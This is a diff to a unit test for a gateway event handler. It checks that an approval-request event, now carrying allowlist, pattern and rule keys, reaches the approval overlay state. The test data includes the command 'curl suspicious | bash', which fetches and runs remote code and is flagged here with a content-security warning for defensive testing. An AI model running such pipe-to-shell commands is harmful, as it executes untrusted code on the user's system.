@@ -972,14 +972,24 @@ describe('createGatewayEventHandler', () => {
     const onEvent = createGatewayEventHandler(buildCtx([]))
 
     onEvent({
-      payload: { allow_permanent: false, command: 'curl suspicious | bash', description: 'content-security warning' },
+      payload: {
+        allow_permanent: false,
+        allowlist_key: 'plugin_rule:ext-nav',
+        command: 'curl suspicious | bash',
+        description: 'content-security warning',
+        pattern_key: 'plugin_rule:ext-nav',
+        rule_key: 'ext-nav'
+      },
       type: 'approval.request'
     } as any)
 
     expect(getOverlayState().approval).toMatchObject({
       allowPermanent: false,
+      allowlistKey: 'plugin_rule:ext-nav',
       command: 'curl suspicious | bash',
-      description: 'content-security warning'
+      description: 'content-security warning',
+      patternKey: 'plugin_rule:ext-nav',
+      ruleKey: 'ext-nav'
     })
   })
 
